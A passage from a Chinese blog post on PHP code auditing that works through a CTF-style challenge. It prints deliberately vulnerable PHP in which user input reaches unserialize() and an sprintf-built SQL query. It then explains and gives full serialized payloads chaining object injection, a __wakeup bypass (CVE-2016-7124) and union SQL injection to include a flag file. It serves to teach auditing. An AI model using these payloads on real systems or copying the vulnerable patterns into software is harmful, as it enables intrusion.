class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__conn</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db_host</span>, <span class="variable">$db_name</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>, <span class="variable">$DEBUG</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;conn)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;conn = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db_name</span>, <span class="variable">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$DEBUG</span>) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;DROP TABLE IF  EXISTS  users&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;<span class="subst">$db_pass</span>&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$back</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> @<span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">        <span class="variable">$obj</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">define</span>(<span class="string">&#x27;IN_FLAG&#x27;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadData</span>(<span class="variable">$obj</span>-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__die</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&#x27;O:&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__close</span>();</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>( <span class="title function_ invoke__">json_encode</span>( <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt; <span class="variable">$msg</span>) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>(<span class="variable">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__conn</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;source&quot;</span>))) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__die</span>(<span class="string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$v</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title function_ invoke__">HITCON</span>(<span class="string">&quot;source&quot;</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db_host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_pass</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">	<span class="variable">$DEBUG</span> = <span class="string">&#x27;xx&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_FLAG&#x27;</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;un3eri@liz3_i3_s0_fun&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问flag.php,显示禁止访问，题目默认显示源码，在下图代码57行，数据库查询内容不为空的情况下，定义常量IN_FLAG，猜测需要满足该条件才能访问flag.php。然后调用loadData函数。loadData函数，对传入参数进行判断，如果验证通过，则作为参数传入到反序列化函数，验证不通过返回为空，该判断绕过可参考Day11,传入内容来源于数据库查询结果，此时可考虑如何构造数据库查询结果。</p>
<p>在index.php页面显示源码中，我们发现SoFun类,如下图，在**__destruct()<strong>函数中，会对类变量$this-&gt;file所对应的文件进行包含，类变量反序列化可控，在loadData函数调用前，对IN_FLAG常量进行了设置，如果loadData函数传入参数值为SoFun类反序列化字符串，且控制类变量<code>$this-&gt;file=flag.php</code>，则可以包含flag.php文件，此时<code>&#39;IN_FLAG&#39;</code>已经设置，可获取到flag，需考虑绕过__wakeup</strong>函数。</p>
<p>考虑如何控制loadData函数传入参数的值，从下图可知，$obj-&gt;role来源于数据库查询结果，而构建sql语句的username字段来源于**$username**,$username变量来源于func_get_args()函数,该函数返回包含调用函数参数列表的数组,如果login()函数传入参数可控，可通过union联合查询，构造查询结果，使构造数据为SoFun类序列化字符串。我们去看一下login函数的调用。<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-21.png"></p>
<p>在HINCON类**__destruct方法中，通过call_user_func_array()函数调用login或source方法，如果$this-&gt;method&#x3D;’login’则可以调用login()函数，$this-&gt;method为类变量，反序列化可控。$this-&gt;args<strong>为调用函数传入参数，意味着login函数中$username变量可控，此时可通过SQL注入，构造查询数据。在进行反序列化时，会调用</strong>__wakeup对类变量args进行处理，此时调用mysql_escape_string函数对$this-&gt;args进行转义。可通过CVE-2016-7124<strong>，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过</strong>__wakeup**的执行。绕过检测，进行sql注入。<br>总结一下思路：</p>
<ol>
<li><p>构造HITCON类反序列化字符串，其中**$method&#x3D;’login’,$args**数组’username’部分可用于构造SQL语句，进行SQL注入，’password’部分任意设置。</p>
</li>
<li><p>调用login()函数后，利用$username构造联合查询，使查询结果为SoFun类反序列化字符串，设置**$file&#x3D;’flag.php’，需绕过__wakeup()**函数。</p>
</li>
<li><p>绕过**LoadData()**函数对反序列化字符串的验证,参考Day11。</p>
</li>
<li><p>SoFun类 __destruct()函数调用后,包含flag.php文件，获取flag，需绕过__wakeup()函数。<br>第二个答案是另一种思路，大家可研究一下。<br>注：因为传参方式为GET，注意进行URL编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;HITCON&quot;:3:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;s:8:&quot;username&quot;;s:81:&quot;1&#x27; union select 1,2,&#x27;a:1:&#123;s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;&#125;&#125;</span><br><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:2:&quot;ff&quot;;O:6:&quot;HITCON&quot;:5:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;i:0;s:12:&quot;1&#x27; or &#x27;1&#x27;--+&quot;;i:1;s:3:&quot;111&quot;;&#125;s:4:&quot;conn&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>上述第二个答案的思路：</p>
</li>
<li><p><strong>构造对象和方法调用</strong>:</p>
<ul>
<li>利用 <code>HITCON</code> 类的 <code>__destruct()</code> 方法在对象被销毁时自动调用。这个方法会检查 <code>method</code> 属性中指定的方法是否属于允许的方法列表（<code>login</code> 或 <code>source</code>），然后动态调用这些方法。</li>
<li>序列化的 <code>HITCON</code> 对象中设置 <code>method</code> 属性为 <code>login</code>，并且通过 <code>args</code> 属性传入用户名和密码，其中用户名部分被设计为 SQL 注入代码。</li>
</ul>
</li>
<li><p><strong>SQL 注入</strong>:</p>
<ul>
<li>在 <code>login()</code> 方法中，构造的 SQL 查询受到 <code>username</code> 字段的影响，这里使用的 <code>sprintf()</code> 函数对 <code>username</code> 和 <code>password</code> 进行格式化并嵌入到 SQL 语句中，允许注入恶意 SQL 代码。</li>
<li>示例中的用户名 <code>&quot;1&#39; union select 1,2,&#39;a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#39;--&quot;</code> 通过 SQL 注入改变了查询结果，让查询返回一个新的 <code>SoFun</code> 类的序列化字符串。</li>
</ul>
</li>
<li><p><strong>反序列化和文件包含</strong>:</p>
<ul>
<li><code>SoFun</code> 类在其 <code>__destruct()</code> 方法中包含一个指定的文件，通过修改 <code>file</code> 属性指向 <code>flag.php</code>，可以在脚本执行末尾包含并执行该文件。</li>
<li>反序列化字符串中，<code>SoFun</code> 对象设置 <code>file</code> 属性为 <code>&quot;flag.php&quot;</code>，在 <code>__destruct()</code> 被调用时包含这个文件，导致执行 <code>flag.php</code> 中的代码并输出 flag。</li>
</ul>
</li>
<li><p><strong>绕过__wakeup()安全措施</strong>:</p>
<ul>
<li>在 <code>SoFun</code> 类中，<code>__wakeup()</code> 方法将 <code>file</code> 属性重置为 <code>&quot;index.php&quot;</code>，为了绕过这个重置，注入的 SQL 必须在 <code>SoFun</code> 对象被反序列化之后执行，以确保 <code>file</code> 的值在执行 <code>__destruct()</code> 时是 <code>&quot;flag.php&quot;</code>。</li>
</ul>
</li>
</ol>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day8-Candle"><span class="toc-number">1.</span> <span class="toc-text">Day8 - Candle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day9-Rabbit"><span class="toc-number">2.</span> <span class="toc-text">Day9 Rabbit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day10-Anticipation"><span class="toc-number">3.</span> <span class="toc-text">Day10 Anticipation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FengCms-1-32-%E7%BD%91%E7%AB%99%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.1.</span> <span class="toc-text">FengCms 1.32 网站重装漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-Log1-6%E7%BD%91%E7%AB%99%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.2.</span> <span class="toc-text">Simple-Log1.6网站重装漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-11-Pumpkin-Pie"><span class="toc-number">4.</span> <span class="toc-text">Day 11 - Pumpkin Pie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">4.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">4.3.</span> <span class="toc-text">题目</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&text=【代码审计】PHP代码审计3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&is_video=false&description=【代码审计】PHP代码审计3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计3&body=Check out this article: https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&title=【代码审计】PHP代码审计3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&name=【代码审计】PHP代码审计3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://g0dam.github.io/2024/10/14/WebSecurity/codeaudit/phpaudit3/&t=【代码审计】PHP代码审计3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
